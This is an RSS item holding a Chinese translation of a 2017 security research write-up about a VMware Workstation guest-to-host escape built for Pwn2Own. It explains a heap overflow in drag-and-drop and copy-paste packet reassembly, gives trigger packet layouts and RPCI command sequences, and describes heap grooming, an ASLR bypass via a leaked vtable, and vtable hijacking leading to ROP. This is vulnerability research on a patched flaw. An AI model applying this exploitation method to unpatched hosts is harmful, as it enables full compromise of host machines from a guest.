&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d158e3218b51842880080a282a3bf0cd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;[作者：李小龙（acez），中文翻译：kelwin]&lt;br&gt;&lt;/p&gt;&lt;h2&gt;1. 介绍&lt;/h2&gt;&lt;p&gt;2017年3月，长亭安全研究实验室（&lt;a href=&quot;https://chaitin.cn/&quot; data-editable=&quot;true&quot; data-title=&quot;Chaitin&quot; class=&quot;&quot;&gt;Chaitin&lt;/a&gt; Security Research Lab）参加了Pwn2Own黑客大赛，我作为团队的一员，一直专注于VMware Workstation Pro的破解，并成功在赛前完成了一个虚拟机逃逸的漏洞利用。（很不）幸运的是，就在Pwn2Own比赛的前一天（3月14日），VMware发布了一个新的版本，其中修复了我们所利用的漏洞。在本文中，我会介绍我们从发现漏洞到完成利用的整个过程。感谢&lt;a href=&quot;http://weibo.com/kelwinyang&quot; data-editable=&quot;true&quot; data-title=&quot;@kelwin&quot; class=&quot;&quot;&gt;@kelwin&lt;/a&gt;在实现漏洞利用过程中给予的帮助，也感谢ZDI的朋友，他们近期也发布了一篇相关&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&quot; data-editable=&quot;true&quot; data-title=&quot;博客&quot; class=&quot;&quot;&gt;博客&lt;/a&gt;，正是这篇博文促使我们完成本篇writeup。&lt;/p&gt;&lt;p&gt;本文主要由三部分组成：首先我们会简要介绍VMware中的RPCI机制，其次我们会描述本文使用的漏洞，最后讲解我们是如何利用这一个漏洞来绕过ASLR并实现代码执行的。&lt;/p&gt;&lt;h2&gt;2. VMware RPCI机制&lt;/h2&gt;&lt;p&gt;VMware实现了多种虚拟机（下文称为guest）与宿主机（下文称文host）之间的通信方式。其中一种方式是通过一个叫做Backdoor的接口，这种方式的设计很有趣，guest只需在用户态就可以通过该接口发送命令。VMware Tools也部分使用了这种接口来和host通信。我们来看部分相关代码（摘自&lt;a href=&quot;https://github.com/vmware/open-vm-tools&quot; data-editable=&quot;true&quot; data-title=&quot;open-vm-tools&quot; class=&quot;&quot;&gt;open-vm-tools&lt;/a&gt;中的lib/backdoor/backdoorGcc64.c）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;void  
Backdoor_InOut(Backdoor_proto *myBp) // IN/OUT  
{
   uint64 dummy;

   __asm__ __volatile__(
#ifdef __APPLE__
        /*
         * Save %rbx on the stack because the Mac OS GCC doesn&#39;t want us to
         * clobber it - it erroneously thinks %rbx is the PIC register.
         * (Radar bug 7304232)
         */
        &quot;pushq %%rbx&quot;           &quot;\n\t&quot;
#endif
        &quot;pushq %%rax&quot;           &quot;\n\t&quot;
        &quot;movq 40(%%rax), %%rdi&quot; &quot;\n\t&quot;
        &quot;movq 32(%%rax), %%rsi&quot; &quot;\n\t&quot;
        &quot;movq 24(%%rax), %%rdx&quot; &quot;\n\t&quot;
        &quot;movq 16(%%rax), %%rcx&quot; &quot;\n\t&quot;
        &quot;movq  8(%%rax), %%rbx&quot; &quot;\n\t&quot;
        &quot;movq   (%%rax), %%rax&quot; &quot;\n\t&quot;
        &quot;inl %%dx, %%eax&quot;       &quot;\n\t&quot;  /* NB: There is no inq instruction */
        &quot;xchgq %%rax, (%%rsp)&quot;  &quot;\n\t&quot;
        &quot;movq %%rdi, 40(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rsi, 32(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rdx, 24(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rcx, 16(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rbx,  8(%%rax)&quot; &quot;\n\t&quot;
        &quot;popq          (%%rax)&quot; &quot;\n\t&quot;
#ifdef __APPLE__
        &quot;popq %%rbx&quot;            &quot;\n\t&quot;
#endif
      : &quot;=a&quot; (dummy)
      : &quot;0&quot; (myBp)
      /*
       * vmware can modify the whole VM state without the compiler knowing
       * it. So far it does not modify EFLAGS. --hpreg
       */
      :
#ifndef __APPLE__
      /* %rbx is unchanged at the end of the function on Mac OS. */
      &quot;rbx&quot;,
#endif
      &quot;rcx&quot;, &quot;rdx&quot;, &quot;rsi&quot;, &quot;rdi&quot;, &quot;memory&quot;
   );
}
&lt;/code&gt;&lt;p&gt;上面的代码中出现了一个很奇怪的指令inl。在通常环境下（例如Linux下默认的I/O权限设置），用户态程序是无法执行I/O指令的，因为这条指令只会让用户态程序出错并产生崩溃。而此处这条指令产生的权限错误会被host上的hypervisor捕捉，从而实现通信。Backdoor所引入的这种从guest上的用户态程序直接和host通信的能力，带来了一个有趣的攻击面，这个攻击面正好满足Pwn2Own的要求：“在这个类型（指虚拟机逃逸这一类挑战）中，攻击必须从guest的非管理员帐号发起，并实现在host操作系统中执行任意代码”。guest将0x564D5868存入$eax，I/O端口号0x5658或0x5659存储在$dx中，分别对应低带宽和高带宽通信。其它寄存器被用于传递参数，例如$ecx的低16位被用来存储命令号。对于RPCI通信，命令号会被设为BDOOR_CMD_MESSAGE（=30）。文件lib/include/backdoor_def.h中包含了一些支持的backdoor命令列表。host捕捉到错误后，会读取命令号并分发至相应的处理函数。此处我省略了很多细节，如果你有兴趣可以阅读相关源码。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;2.1 RPCI&lt;/h2&gt;&lt;p&gt;远程过程调用接口RPCI（Remote Procedure Call Interface）是基于前面提到的Backdoor机制实现的。依赖这个机制，guest能够向host发送请求来完成某些操作，例如，拖放（Drag n Drop）/复制粘贴（Copy Paste）操作、发送或获取信息等等。RPCI请求的格式非常简单：&amp;lt;命令&amp;gt; &amp;lt;参数&amp;gt;。例如RPCI请求info-get guestinfo.ip可以用来获取guest的IP地址。对于每个RPCI命令，在vmware-vmx进程中都有相关注册和处理操作。&lt;/p&gt;&lt;p&gt;需要注意的是有些RPCI命令是基于VMCI套接字实现的，但此内容已超出本文讨论的范畴。&lt;/p&gt;&lt;h2&gt;3. 漏洞&lt;/h2&gt;&lt;p&gt;花了一些时间逆向各种不同的RPCI处理函数之后，我决定专注于分析拖放（Drag n Drop，下面简称为DnD）和复制粘贴（Copy Paste，下面简称为CP）功能。这部分可能是最复杂的RPCI命令，也是最可能找到漏洞的地方。在深入理解的DnD/CP内部工作机理后，可以很容易发现，在没有用户交互的情况下，这些处理函数中的许多功能是无法调用的。DnD/CP的核心功能维护了一个状态机，在无用户交互（例如拖动鼠标从host到guest中）情况下，许多状态是无法达到的。&lt;/p&gt;&lt;p&gt;我决定看一看Pwnfest 2016上被利用的漏洞，该漏洞在&lt;a href=&quot;https://www.vmware.com/security/advisories/VMSA-2016-0019.html&quot; data-editable=&quot;true&quot; data-title=&quot;这个&quot;&gt;这个&lt;/a&gt;VMware安全公告中有所提及。此时我的idb已经标上了很多符号，所以很容易就通过bindiff找到了补丁的位置。下面的代码是修补之前存在漏洞的函数（可以看出services/plugins/dndcp/dnddndCPMsgV4.c中有对应源码，漏洞依然存在于&lt;a href=&quot;https://github.com/vmware/open-vm-tools&quot; data-editable=&quot;true&quot; data-title=&quot;open-vm-tools&quot;&gt;open-vm-tools&lt;/a&gt;的git仓库的master分支当中）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;static Bool  
DnDCPMsgV4IsPacketValid(const uint8 *packet,  
                        size_t packetSize)
{
   DnDCPMsgHdrV4 *msgHdr = NULL;
   ASSERT(packet);

   if (packetSize &amp;lt; DND_CP_MSG_HEADERSIZE_V4) {
      return FALSE;
   }

   msgHdr = (DnDCPMsgHdrV4 *)packet;

   /* Payload size is not valid. */
   if (msgHdr-&amp;gt;payloadSize &amp;gt; DND_CP_PACKET_MAX_PAYLOAD_SIZE_V4) {
      return FALSE;
   }

   /* Binary size is not valid. */
   if (msgHdr-&amp;gt;binarySize &amp;gt; DND_CP_MSG_MAX_BINARY_SIZE_V4) {
      return FALSE;
   }

   /* Payload size is more than binary size. */
   if (msgHdr-&amp;gt;payloadOffset + msgHdr-&amp;gt;payloadSize &amp;gt; msgHdr-&amp;gt;binarySize) { // [1]
      return FALSE;
   }

   return TRUE;
}

Bool  
DnDCPMsgV4_UnserializeMultiple(DnDCPMsgV4 *msg,  
                               const uint8 *packet,
                               size_t packetSize)
{
   DnDCPMsgHdrV4 *msgHdr = NULL;
   ASSERT(msg);
   ASSERT(packet);

   if (!DnDCPMsgV4IsPacketValid(packet, packetSize)) {
      return FALSE;
   }

   msgHdr = (DnDCPMsgHdrV4 *)packet;

   /*
    * For each session, there is at most 1 big message. If the received
    * sessionId is different with buffered one, the received packet is for
    * another another new message. Destroy old buffered message.
    */
   if (msg-&amp;gt;binary &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.sessionId != msgHdr-&amp;gt;sessionId) {
      DnDCPMsgV4_Destroy(msg);
   }

   /* Offset should be 0 for new message. */
   if (NULL == msg-&amp;gt;binary &amp;amp;&amp;amp; msgHdr-&amp;gt;payloadOffset != 0) {
      return FALSE;
   }

   /* For existing buffered message, the payload offset should match. */
   if (msg-&amp;gt;binary &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.sessionId == msgHdr-&amp;gt;sessionId &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.payloadOffset != msgHdr-&amp;gt;payloadOffset) {
      return FALSE;
   }

   if (NULL == msg-&amp;gt;binary) {
      memcpy(msg, msgHdr, DND_CP_MSG_HEADERSIZE_V4);
      msg-&amp;gt;binary = Util_SafeMalloc(msg-&amp;gt;hdr.binarySize);
   }

   /* msg-&amp;gt;hdr.payloadOffset is used as received binary size. */
   memcpy(msg-&amp;gt;binary + msg-&amp;gt;hdr.payloadOffset,
          packet + DND_CP_MSG_HEADERSIZE_V4,
          msgHdr-&amp;gt;payloadSize); // [2]
   msg-&amp;gt;hdr.payloadOffset += msgHdr-&amp;gt;payloadSize;
   return TRUE;
}
&lt;/code&gt;&lt;p&gt;对于Version 4的DnD/CP功能，当guest发送分片DnD/CP命令数据包时，host会调用上面的函数来重组guest发送的DnD/CP消息。接收的第一个包必须满足payloadOffset为0，binarySize代表堆上分配的buffer长度。[1]处的检查比较了包头中的binarySize，用来确保payloadOffset和payloadSize不会越界。在[2]处，数据会被拷入分配的buffer中。但是[1]处的检查存在问题，它只对接收的第一个包有效，对于后续的数据包，这个检查是无效的，因为代码预期包头中的binarySize和分片流中的第一个包相同，但实际上你可以在后续的包中指定更大的binarySize来满足检查，并触发堆溢出。&lt;/p&gt;&lt;p&gt;所以，该漏洞可以通过发送下面的两个分片来触发：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;packet 1{  
 ...
 binarySize = 0x100
 payloadOffset = 0
 payloadSize = 0x50
 sessionId = 0x41414141
 ...
 #...0x50 bytes...#
}

packet 2{  
 ...
 binarySize = 0x1000
 payloadOffset = 0x50
 payloadSize = 0x100
 sessionId = 0x41414141
 ...
 #...0x100 bytes...#
}
&lt;/code&gt;&lt;p&gt;有了以上的知识，我决定看看Version 3中的DnD/CP功能中是不是也存在类似的问题。令人惊讶的是，几乎相同的漏洞存在于Version 3的代码中（这个漏洞最初通过逆向分析来发现，但是我们后来意识到v3的代码也在open-vm-tools的git仓库中）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;Bool  
DnD_TransportBufAppendPacket(DnDTransportBuffer *buf,          // IN/OUT  
                             DnDTransportPacketHeader *packet, // IN
                             size_t packetSize)                // IN
{
   ASSERT(buf);
   ASSERT(packetSize == (packet-&amp;gt;payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) &amp;amp;&amp;amp;
          packetSize &amp;lt;= DND_MAX_TRANSPORT_PACKET_SIZE &amp;amp;&amp;amp;
          (packet-&amp;gt;payloadSize + packet-&amp;gt;offset) &amp;lt;= packet-&amp;gt;totalSize &amp;amp;&amp;amp;
          packet-&amp;gt;totalSize &amp;lt;= DNDMSG_MAX_ARGSZ);

   if (packetSize != (packet-&amp;gt;payloadSize + DND_TRANSPORT_PACKET_HEADER_SIZE) ||
       packetSize &amp;gt; DND_MAX_TRANSPORT_PACKET_SIZE ||
       (packet-&amp;gt;payloadSize + packet-&amp;gt;offset) &amp;gt; packet-&amp;gt;totalSize || //[1]
       packet-&amp;gt;totalSize &amp;gt; DNDMSG_MAX_ARGSZ) {
      goto error;
   }

   /*
    * If seqNum does not match, it means either this is the first packet, or there
    * is a timeout in another side. Reset the buffer in all cases.
    */
   if (buf-&amp;gt;seqNum != packet-&amp;gt;seqNum) {
      DnD_TransportBufReset(buf);
   }

   if (!buf-&amp;gt;buffer) {
      ASSERT(!packet-&amp;gt;offset);
      if (packet-&amp;gt;offset) {
         goto error;
      }
      buf-&amp;gt;buffer = Util_SafeMalloc(packet-&amp;gt;totalSize);
      buf-&amp;gt;totalSize = packet-&amp;gt;totalSize;
      buf-&amp;gt;seqNum = packet-&amp;gt;seqNum;
      buf-&amp;gt;offset = 0;
   }

   if (buf-&amp;gt;offset != packet-&amp;gt;offset) {
      goto error;
   }

   memcpy(buf-&amp;gt;buffer + buf-&amp;gt;offset,
          packet-&amp;gt;payload,
          packet-&amp;gt;payloadSize);
   buf-&amp;gt;offset += packet-&amp;gt;payloadSize;
   return TRUE;

error:  
   DnD_TransportBufReset(buf);
   return FALSE;
}
&lt;/code&gt;&lt;p&gt;Version 3的DnD/CP在分片重组时，上面的函数会被调用。此处我们可以在[1]处看到与之前相同的情形，代码依然假设后续分片中的totalSize会和第一个分片一致。因此这个漏洞可以用和之前相同的方法触发：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;packet 1{  
 ...
 totalSize = 0x100
 payloadOffset = 0
 payloadSize = 0x50
 seqNum = 0x41414141
 ...
 #...0x50 bytes...#
}

packet 2{  
 ...
 totalSize = 0x1000
 payloadOffset = 0x50
 payloadSize = 0x100
 seqNum = 0x41414141
 ...
 #...0x100 bytes...#
}
&lt;/code&gt;&lt;p&gt;在Pwn2Own这样的比赛中，这个漏洞是很弱的，因为它只是受到之前漏洞的启发，而且甚至可以说是同一个。因此，这样的漏洞在赛前被修补并不惊讶（好吧，也许我们并不希望这个漏洞在比赛前一天被修复）。对应的VMware安全公告在&lt;a href=&quot;https://www.vmware.com/security/advisories/VMSA-2017-0005.html&quot; data-editable=&quot;true&quot; data-title=&quot;这里&quot;&gt;这里&lt;/a&gt;。受到这个漏洞影响的VMWare Workstation Pro最新版本是12.5.3。&lt;/p&gt;&lt;p&gt;接下来，让我们看一看这个漏洞是如何被用来完成从guest到host的逃逸的！&lt;/p&gt;&lt;h2&gt;4. 漏洞利用&lt;/h2&gt;&lt;p&gt;为了实现代码执行，我们需要在堆上覆盖一个函数指针，或者破坏C++对象的虚表指针。&lt;/p&gt;&lt;p&gt;首先让我们看一看如何将DnD/CP协议的设置为version 3，依次发送下列RPCI命令即可：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;tools.capability.dnd_version 3  
tools.capability.copypaste_version 3  
vmx.capability.dnd_version  
vmx.capability.copypaste_version  
&lt;/code&gt;&lt;p&gt;前两行消息分别设置了DnD和Copy/Paste的版本，后续两行用来查询版本，这是必须的，因为只有查询版本才会真正触发版本切换。RPCI命令vmx.capability.dnd_version会检查DnD/CP协议的版本是否已被修改，如果是，就会创建一个对应版本的C++对象。对于version 3，2个大小为0xA8的C++对象会被创建，一个用于DnD命令，另一个用于Copy/Paste命令。&lt;/p&gt;&lt;p&gt;这个漏洞不仅可以让我们控制分配的大小和溢出的大小，而且能够让我们进行多次越界写。理想的话，我们可以用它分配大小为0xA8的内存块，并让它分配在C++对象之前，然后利用堆溢出改写C++对象的vtable指针，使其指向可控内存，从而实现代码执行。&lt;/p&gt;&lt;p&gt;这并非易事，在此之前我们必须解决一些其他问题。首先我们需要找到一个方法来绕过ASLR，同时处理好Windows Low Fragmented Heap。&lt;/p&gt;&lt;h2&gt;4.1 绕过ASLR&lt;/h2&gt;&lt;p&gt;一般来说，我们需要找到一个对象，通过溢出来影响它，然后实现信息泄露。例如破坏一个带有长度或者数据指针的对象，并且可以从guest读取，然而我们没有找到这种对象。于是我们逆向了更多的RPCI命令处理函数，来寻找可用的东西。那些成对的命令特别引人关注，例如你能用一个命令来设置一些数据，同时又能用相关命令来取回数据，最终我们找到的是一对命令info-set和info-get：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;info-set guestinfo.KEY VALUE  
info-get guestinfo.KEY  
&lt;/code&gt;&lt;p&gt;VALUE是一个字符串，字符串的长度可以控制堆上buffer的分配长度，而且我们可以分配任意多的字符串。但是如何用这些字符串来泄露数据呢？我们可以通过溢出来覆盖结尾的null字节，让字符串连接上相邻的内存块。如果我们能够在发生溢出的内存块和DnD或CP对象之间分配一个字符串，那么我们就能泄露对象的vtable地址，从而我们就可以知道vmware-vmx的地址。尽管Windows的LFH堆分配存在随机化，但我们能够分配任意多的字符串，因此可以增加实现上述堆布局的可能性，但是我们仍然无法控制溢出buffer后面分配的是DnD还是CP对象。经过我们的测试，通过调整一些参数，例如分配和释放不同数量的字符串，我们可以实现60%到80%的成功率。&lt;/p&gt;&lt;p&gt;下图总结了我们构建的堆布局情况（Ov代表溢出内存块，S代表String，T代表目标对象）。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-93e4655e592de30605e67ece4e9f1ce5_r.png&quot; data-rawwidth=&quot;1292&quot; data-rawheight=&quot;680&quot;&gt;&lt;p&gt;我们的策略是：首先分配一些填满“A”的字符串，然后通过溢出写入一些“B”，接下来读取所有分配的字符串，其中含有“B”的就是被溢出的字符串。这样我们就找到了一个字符串可以被用来读取泄露的数据，然后以bucket的内存块大小0xA8的粒度继续溢出，每次溢出后都检查泄露的数据。由于DnD和CP对象的vtable距离vmware-vmx基地址的偏移是固定的，每次溢出后只需要检查最低一些数据位，就能够判断溢出是否到达了目标对象。&lt;/p&gt;&lt;h2&gt;4.2 获取代码执行&lt;/h2&gt;&lt;p&gt;现在我们实现了信息泄露，也能知道溢出的是哪个C++对象，接下来要实现代码执行。我们需要处理两种情形：溢出CopyPaste和DnD。需要指出的是能利用的代码路径有很多，我们只是选择了其中一个。&lt;/p&gt;&lt;h2&gt;4.2.1 覆盖CopyPaste对象&lt;/h2&gt;&lt;p&gt;对于CopyPaste对象，我们可以覆盖虚表指针，让它指向我们可控的其他数据。我们需要找到一个指针，指针指向的数据是可控并被用做对象的虚表。为此我们使用了另一个RPCI命令unity.window.contents.start。这个命令主要用于Unity模式下，在host上绘制一些图像。这个操作可以让我们往相对vmware-vmx偏移已知的位置写入一些数据。该命令接收的参数是图像的宽度和高度，二者都是32位，合并起来我们就在已知位置获得了一个64位的数据。我们用它来作为虚表中的一个指针，通过发送一个CopyPast命令即可触发该虚函数调用，步骤如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;发送unity.window.contents.start命令，通过指定参数宽度和高度，往全局变量处写入一个64位的栈迁移gadget地址&lt;/li&gt;&lt;li&gt;覆盖对象虚表指针，指向伪造的虚表（调整虚表地址偏移）&lt;/li&gt;&lt;li&gt;发送CopyPaste命令，触发虚函数调用&lt;/li&gt;&lt;li&gt;ROP&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;4.2.2 覆盖DnD对象&lt;/h2&gt;&lt;p&gt;对于DnD对象，我们不能只覆盖vtable指针，因为在发生溢出之后vtable会立马被访问，另一个虚函数会被调用，而目前我们只能通过unity图像的宽度和高度控制一个qword，所以无法控制更大的虚表。&lt;/p&gt;&lt;p&gt;让我们看一看DnD和CP对象的结构，总结如下（一些类似的结构可以在open-vm-tools中找到，但是在vmware-vmx中会略有区别）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;DnD_CopyPaste_RpcV3{  
    void * vtable;
    ...
    uint64_t ifacetype;
    RpcUtil{
        void * vtable;
        RpcBase * mRpc;
        DnDTransportBuffer{
            uint64_t seqNum;
            uint8_t * buffer;
            uint64_t totalSize;
            uint64_t offset;
            ...
        }
        ...
    }
}

RpcBase{  
    void * vtable;
    ...
}
&lt;/code&gt;&lt;p&gt;我们在此省略了结构中很多与本文无关的属性。对象中有个指针指向另一个C++对象RpcBase，如果我们能用一个可控数据的指针的指针覆盖mRpc这个域，那我们就控制了RpcBase的vtable。对此我们可以继续使用unity.window.contents.start命令来来控制mRpc，该命令的另一个参数是imgsize，这个参数代表分配的图像buffer的大小。这个buffer分配出来后，它的地址会存在vmware-vmx的固定偏移处。我们可以使用命令unity.window.contents.chunk来填充buffer的内容。步骤如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;发送unity.window.contents.start命令来分配一个buffer，后续我们用它来存储一个伪造的vtable。&lt;/li&gt;&lt;li&gt;发送unity.window.contents.chunk命令来填充伪造的vtable，其中填入一个栈迁移的gadget&lt;/li&gt;&lt;li&gt;通过溢出覆盖DnD对象的mRpc域，让它指向存储buffer地址的地方（某全局变量处），即写入一个指针的指针&lt;/li&gt;&lt;li&gt;通过发送DnD命令来触发mRpc域的虚函数调用&lt;/li&gt;&lt;li&gt;ROP&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;P.S：vmware-vmx进程中有一个可读可写可执行的内存页（至少在版本12.5.3中存在）。&lt;/p&gt;&lt;h2&gt;4.3 稳定性讨论&lt;/h2&gt;&lt;p&gt;正如前面提及的，因为Windows LFH堆的随机化，当前的exploit无法做到100%成功率。不过可以尝试下列方法来提高成功率：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;观察0xA8大小的内存分配，考虑是否可以通过一些malloc和free的调用来实现确定性的LFH分配，参考&lt;a href=&quot;http://illmatics.com/Understanding_the_LFH.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;这里&quot;&gt;这里&lt;/a&gt;和&lt;a href=&quot;https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals-wp.pdf&quot; data-editable=&quot;true&quot; data-title=&quot;这里&quot;&gt;这里&lt;/a&gt;。&lt;/li&gt;&lt;li&gt;寻找堆上的其他C++对象，尤其是那些可以在堆上喷射的&lt;/li&gt;&lt;li&gt;寻找堆上其他带有函数指针的对象，尤其是那些可以在堆上喷射的&lt;/li&gt;&lt;li&gt;找到一个独立的信息泄漏漏洞&lt;/li&gt;&lt;li&gt;打开更多脑洞&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;4.4 演示效果&lt;/h2&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-d158e3218b51842880080a282a3bf0cd_r.png&quot; data-rawwidth=&quot;960&quot; data-rawheight=&quot;540&quot;&gt;&lt;br&gt;&lt;p&gt;演示视频：&lt;/p&gt;&lt;video id=&quot;105076&quot; data-swfurl=&quot;&quot; poster=&quot;&quot; data-sourceurl=&quot;http://v.youku.com/v_show/id_XMjg3MjcwMzU4MA==.html?spm=a2h3j.8428770.3416059.1&quot; data-name=&quot;VMware workstation 12.5.3逃逸演示—在线播放—优酷网，视频高清在线观看&quot; data-video-id=&quot;&quot; data-video-playable=&quot;&quot; data-lens-id=&quot;&quot;&gt;&lt;/video&gt;&lt;br&gt;&lt;h3&gt;5. 感想与总结&lt;/h3&gt;&lt;p&gt;“No pwn no fun”，如果你想参加Pwn2Own这样的比赛，你就需要准备多个漏洞，或者找到高质量的漏洞。&lt;/p&gt;&lt;h2&gt;6. 我是广告&lt;/h2&gt;&lt;p&gt;对安全研究、安全研发感兴趣的朋友欢迎投简历到hr@chaitin.com。&lt;/p&gt;</description>
<author>杨坤</author>
<guid isPermaLink="false">2017-07-06-27733895</guid>
<pubDate>Thu, 06 Jul 2017 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
